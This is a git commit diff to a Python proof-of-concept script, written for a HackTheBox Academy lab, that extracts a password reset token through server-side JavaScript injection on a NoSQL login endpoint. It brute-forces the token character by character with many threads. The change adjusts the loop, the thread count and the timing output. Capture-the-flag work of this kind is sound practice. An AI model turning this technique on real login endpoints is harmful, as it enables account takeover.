155f55d2d1842d6c972e333d450e596d870e26c7
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-05-15 08:12:51 -0400

    Update Mangofile.py

--- HTBAcademy: POC-Scripts/Mangofile.py
+++ HTBAcademy: POC-Scripts/Mangofile.py
@@ -1,6 +1,7 @@
 #! /usr/bin/env python3
 # This script exploits a server side javascript injection on a NoSQL database to get the password reset token.  
 # Wrote this to solve the lab on HackTheBox Academy - NoSQL Injection - Skills Assessment II
+#!/usr/bin/env python3
 
 import requests
 import string
@@ -9,15 +10,15 @@ import time
 
 def nosqli():
     secret = ''
-    counter = 0
+    finished = False
     url = "http://83.136.251.226:38620/login"
     proxies = {"http": "http://127.0.0.1:8080"}
     headers = {"Content-type": "application/x-www-form-urlencoded"}
 
-    while counter < 40:
+    while finished == False:
         found_char = None
         list= string.ascii_uppercase + string.digits + '-'
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
             future_to_char = {executor.submit(test_char, secret, char, url, proxies, headers): char for char in list}
             for future in concurrent.futures.as_completed(future_to_char):
                 char = future_to_char[future]
@@ -27,10 +28,9 @@ def nosqli():
 
         if found_char:
             secret += found_char
-            print(secret)
-            counter += 1
+            print(secret)        
         else:
-            counter = 10000
+            finished = True
 
 def test_char(secret, char, url, proxies, headers):
     data = {
@@ -40,10 +40,10 @@ def test_char(secret, char, url, proxies, headers):
     response = requests.post(url=url, proxies=proxies, headers=headers, data=data)
     return len(response.text) == 2191
 
-try:
-    start_time= time.time()
-    nosqli()
-    end_time= time.time()
-    print(f"Time it took to find the token: {end_time - start_time}")
+try:    
+    st= time.time()
+    nosqli()    
+    et= time.time()
+    print(f"This took {et - st} seconds")
 except KeyboardInterrupt:
     print("ctrl + c detected, exiting gracefully...")
